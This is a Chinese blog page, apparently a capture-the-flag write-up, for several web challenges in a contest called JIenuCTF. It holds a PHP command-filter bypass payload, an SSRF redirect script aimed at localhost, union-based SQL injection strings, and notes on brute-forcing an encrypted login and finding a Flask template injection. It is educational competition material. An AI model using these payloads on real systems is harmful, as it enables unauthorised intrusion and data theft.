@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="easy_login(web)首先看网页源码，发现一段加密密钥">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JIenuCTF">
+<meta property="og:url" content="http://example.com/2021/05/24/JlenuCTF/index.html">
+<meta property="og:site_name" content="Y0ng的博客">
+<meta property="og:description" content="easy_login(web)首先看网页源码，发现一段加密密钥">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210521202932486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210521202617198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210521203032484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021052322340685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210523223454333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210523223330664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210520085711351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210522165752373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210522092405584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210522080731326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210522092815245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/202105220929510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210522093007215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210522184438512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210522212123629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021052221333721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210520091213598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210521175359434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210521180608939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021052118115260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210521181258560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210520092237463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210520093704613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021052209450794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210522094730894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021052212334876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210523223843510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021052322482633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210523224801274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210523231645612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210523231619390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210523231106490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2021-05-24T14:42:31.721Z">
+<meta property="article:modified_time" content="2021-05-24T14:42:26.916Z">
+<meta property="article:author" content="程勇胜">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210521202932486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+
+<link rel="canonical" href="http://example.com/2021/05/24/JlenuCTF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>JIenuCTF | Y0ng的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y0ng的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">65</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/24/JlenuCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="程勇胜">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JIenuCTF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-24 22:42:31 / 修改时间：22:42:26" itemprop="dateCreated datePublished" datetime="2021-05-24T22:42:31+08:00">2021-05-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="easy-login-web"><a href="#easy-login-web" class="headerlink" title="easy_login(web)"></a>easy_login(web)</h1><p>首先看网页源码，发现一段加密密钥</p>
+<p><img src="https://img-blog.csdnimg.cn/20210521202932486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<a id="more"></a>
+
+<p>又看到有两个js文件是来自平台的，其他文件指向官网，下载两个文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20210521202617198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>找到一段加密函数，看到用的是ECB 方式</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_etd2</span>(<span class="params">_p0, _p1</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="keyword">var</span> _p2 = CryptoJS.AES.encrypt(_p0, CryptoJS.enc.Utf8.parse(_p1),&#123;</span><br><span class="line">                   mode: CryptoJS.mode.ECB,</span><br><span class="line">                   padding: CryptoJS.pad.Pkcs7</span><br><span class="line">                 &#125;).toString();   </span><br><span class="line">               $(<span class="string">&quot;#casLoginForm&quot;</span>).find(<span class="string">&quot;#passwordEncrypt&quot;</span>).val(_p2);</span><br><span class="line">           &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">               $(<span class="string">&quot;#casLoginForm&quot;</span>).find(<span class="string">&quot;#passwordEncrypt&quot;</span>).val(_p0);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+
+<p>抓包验证一下，直接出密码，接下来就是爆破密码，加密，爆破发送<br><img src="https://img-blog.csdnimg.cn/20210521203032484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"><br>关键是使用bp中的插件：</p>
+<p>插件名称：BurpCrypto<br><img src="https://img-blog.csdnimg.cn/2021052322340685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210523223454333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210523223330664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<hr>
+<h1 id="BDE-CAT-web"><a href="#BDE-CAT-web" class="headerlink" title="BDE_CAT(web)"></a>BDE_CAT(web)</h1><p>开局一张猫<br><img src="https://img-blog.csdnimg.cn/20210520085711351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>查看源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&#39;cat.jpg&#39; height&#x3D;400&gt;&lt;!-- is_debug --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问?is_debug 得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$message</span> = <span class="string">&quot;&lt;img src=&#x27;cat.jpg&#x27; height=400&gt;&lt;!-- is_debug --&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;is_debug&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>) <span class="keyword">and</span> <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!(substr_count(<span class="variable">$qs</span>, <span class="string">&#x27;_&#x27;</span>) &gt; <span class="number">0</span>) &amp;&amp; !(substr_count(<span class="variable">$qs</span>, <span class="string">&#x27;%&#x27;</span>)&gt; <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c_m_d&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/(\||&amp;;| |\/|cat|flag&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;/sandboxed_bin/&quot;</span>.<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$message</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$message</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 意思：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/aaa/?p=222">http://localhost/aaa/?p=222</a> </p>
+<p>结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#39;QUERY_STRING&#39;] &#x3D; &quot;p&#x3D;222&quot;;</span><br><span class="line">$_SERVER[&#39;REQUEST_URI&#39;]  &#x3D; &quot;&#x2F;aaa&#x2F;?p&#x3D;222&quot;;</span><br><span class="line">$_SERVER[&#39;SCRIPT_NAME&#39;]  &#x3D; &quot;&#x2F;aaa&#x2F;index.php&quot;;</span><br><span class="line">$_SERVER[&#39;PHP_SELF&#39;]     &#x3D; &quot;&#x2F;aaa&#x2F;index.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>查询的不能含有 <code>_</code>和 <code>%</code></p>
+<p>且只有get <code>c_m_d</code>才能执行system</p>
+<p>php解析特性可以使用<code>+</code> 和<code>.</code>和代替成 <code>_</code></p>
+<p><code>/sandboxed_bin/</code> 后面可以拼接 cat</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c.m.d&#x3D;???+????.???</span><br></pre></td></tr></table></figure>
+
+<p>flag: JlenuCTF{hPHPPP_c@t_Bypass}</p>
+<hr>
+<h1 id="Easy-SSRF-web"><a href="#Easy-SSRF-web" class="headerlink" title="Easy_SSRF(web)"></a>Easy_SSRF(web)</h1><p>先看一下网页源码</p>
+<p><img src="https://img-blog.csdnimg.cn/20210522165752373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>经过测试，服务器上搭建一个302跳转页面 或者 直接生成个</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php%E7%9A%84%E7%9F%AD%E9%93%BE%E6%8E%A5%E6%89%93%E8%BF%87%E5%8E%BB%E5%B0%B1%E8%A1%8C%E4%BA%86">http://127.0.0.1/flag.php的短链接打过去就行了</a></p>
+<p>1.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.79.25.56:5566&#x2F;?url&#x3D;http:&#x2F;&#x2F;x.x.x.x&#x2F;1.php</span><br></pre></td></tr></table></figure>
+
+<p>flag: JlenuCTF{ssrf_is_so_esay!}</p>
+<hr>
+<h1 id="Strange-SQLI-web"><a href="#Strange-SQLI-web" class="headerlink" title="Strange_SQLI(web)"></a>Strange_SQLI(web)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;1%20And%201&#x3D;1--+</span><br><span class="line">index.php?id&#x3D;0%20union%20select%20database()   &#x2F;&#x2F;  jlenu_ctf</span><br></pre></td></tr></table></figure>
+<p>测了几次整形注入发现有时候对的也会报错，而且好像还是有规律的报错，导致我不能确定到底是不是过滤，索性直接猜表 和字段，真猜出来了<br><img src="https://img-blog.csdnimg.cn/20210522092405584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>后来hint：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目有个动态随机waf用来防止sqlmap，如单条语句无法回显，请多试几次</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="MIAOHUB-web"><a href="#MIAOHUB-web" class="headerlink" title="MIAOHUB(web)"></a>MIAOHUB(web)</h1><p><img src="https://img-blog.csdnimg.cn/20210522080731326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>以为是文件上传，谁知道是SSTI？？？</p>
+<p><img src="https://img-blog.csdnimg.cn/20210522092815245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>flask 2.0</p>
+<p><img src="https://img-blog.csdnimg.cn/202105220929510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210522093007215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>发现注入点</p>
+<p>查看config：</p>
